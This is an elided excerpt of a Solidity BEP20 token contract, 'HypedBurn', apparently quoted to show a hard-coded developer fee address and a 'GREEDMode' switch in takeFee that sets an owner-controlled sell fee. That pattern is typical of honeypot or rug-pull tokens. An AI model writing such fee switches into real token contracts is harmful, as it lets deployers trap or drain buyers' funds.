...
/* Token contract */
contract HypedBurn is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0x152Cfad2430Ca720211C093dABB61CeC77e476e7;
    ...
    // Name and symbol
    string constant _name = "HypedBurn";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x152Cfad2430Ca720211C093dABB61CeC77e476e7;
    ...
    function takeFee(address sender, uint256 amount, bool isSell, bool GREEDMode) internal returns (uint256) {
        ...
        if (GREEDMode){
            if(isSell){
                ...
                feeAmount = amount.mul(totalFee).div(1).div(feeDenominator);
            }
        } else {
